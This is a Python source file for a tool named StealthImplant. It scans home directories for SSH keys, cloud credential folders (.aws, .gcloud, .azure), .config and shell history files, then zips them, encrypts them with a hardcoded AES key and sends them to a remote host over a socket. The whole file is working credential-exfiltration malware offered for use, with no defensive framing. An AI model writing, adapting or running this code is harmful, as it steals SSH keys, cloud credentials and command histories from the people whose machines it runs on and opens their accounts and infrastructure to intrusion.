import os
from pathlib import Path
import zipfile
from io import BytesIO
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import socket
import sys

class StealthImplant:
    
    # we scan from "source"
    # we look for file matching "target"
    def __init__(
        self, 
        server_ip=None,
        server_port=None,
        source="/home/",
        # This can be either directory or file
        target_files=[
            ".ssh", 
            ".config", 
            ".aws", 
            ".gcloud",
            ".azure",
        ],
        history_glob=".*_history",
        test=False
    ):

        self.server_ip = server_ip
        self.server_port = server_port

        self.root_dir=Path(source).expanduser()
        self.target_files=target_files
        self.history_glob=history_glob
        self.test=test
        # self.ignore_dirs = {"lost+found", "cache", "tmp" }
        self.encryption_key = b'16bytessecretkey'  # AES-128
        self.encryption_iv = b'16bytepubliciv!!'
        
        self._log("Implant initialize")
        self._log(f"source: {source}")
        self._log(f"target files: {target_files}")
    
    def run(self):
        try:
            self._log("Running...")
            collected_files=self.walk_dir()
            self._log(f"successfully retrieve {len(collected_files)} files")
            zip_data = self.create_zip(collected_files)
            self._log(f"Successfully zip data")
            encrypted = self.encrypt(zip_data)
            self._log(f"Successfully encrypted data")

            if self.server_ip and self.server_port:
                self.send_to_server(encrypted, self.server_ip, self.server_port)
                self._log("Successfully send to server")
            else:
                self._log("Server ip and port is not provided")

            return True
        except Exception as e:
            self._log(f"Error: {e}")
            return False

    # get list of file from source
    # matching target
    def walk_dir(self):
        collected = [] 
        for root, dirs, files in os.walk(self.root_dir, followlinks=False):
            # dirs[:] = [d for d in dirs if d not in self.ignore_dirs]
            
            # if current directly is what we are looking for
            if any(target_dir in root for target_dir in self.target_files):
                for f in files:
                    self._log(f"Found: ${Path(root) / f}")
                    collected.append(Path(root) / f)
            
            # if it contains the file we need
            for f in files:
                if f in self.target_files:
                    self._log(f"Found: {Path(root) / f}")
                    collected.append(Path(root) / f)
                    
            if self.history_glob:
                for f in files:
                    if Path(f).match(self.history_glob):
                        self._log(f"Found: {Path(root) / f}")
                        collected.append(Path(root) / f)

        return list(set(collected))

        
    # zip the files we found
    def create_zip(self, files):
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
            for path in files:
                if path.is_symlink():
                    self._log(f"skipped {path}: symlink")
                    continue

                try:
                    arcname = str(Path(self.root_dir.name)/ path.relative_to(self.root_dir))
                    zf.write(path, arcname)
                except Exception as e:
                    self._log(f"skipped {path}: {e}")
        return zip_buffer.getvalue()

    # encrypt the data
    def encrypt(self, data):
        cipher = AES.new(self.encryption_key, AES.MODE_CBC, self.encryption_iv)
        return cipher.encrypt(pad(data, AES.block_size))
    
    # send to server
    def send_to_server(self,data, ip, port):
        with socket.socket() as sock:
            sock.connect((ip, port))
            sock.sendall(data)

    def _log(self, message:str):
        if self.test: print(message)

def main():
    if len(sys.argv) != 3:
        print("Usage: ./tmp363 <host> <port>")
    host = sys.argv[1]
    port = int(sys.argv[2])
    implant = StealthImplant(
        server_ip=host, 
        server_port=port,
        test=True
    )
    implant.run()

if __name__ == "__main__":
    main()





